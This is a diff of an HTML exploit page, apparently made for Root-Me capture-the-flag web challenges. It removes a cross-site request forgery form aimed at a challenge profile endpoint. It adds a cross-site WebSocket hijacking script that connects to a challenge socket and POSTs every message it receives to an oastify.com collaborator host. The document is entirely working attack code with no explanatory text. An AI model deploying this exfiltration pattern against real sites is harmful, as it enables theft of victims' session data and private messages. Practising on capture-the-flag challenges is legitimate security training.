@@ -1,20 +1,13 @@
 <html>
 <script>
-	fetch("https://2ada5rw0l83t57k8aoktd8qea5gw41sq.oastify.com", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ message: "hello" }) });
+    var ws = new WebSocket('wss://ctf15.root-me.org/ws');
+    ws.onopen = function() {
+        ws.send("Hello");
+    };
+    ws.onmessage = function(event) {
+        fetch('http://4uzbdr9q6oswwcob6ium5htpsgy7mxam.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
 </script>
 <body>
-<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
-		<div class="form-group">
-		<label>Username:</label>
-		<input type="text" name="username" value="test">
-		</div>
-		<br>		
-		<div class="form-group">
-		<label>Status:</label>
-		<input type="checkbox" name="status" value="on" checked>
-		</div>
-		<br>	
-		<button type="submit">Submit</button>
-</form>
 </body>
 </html>
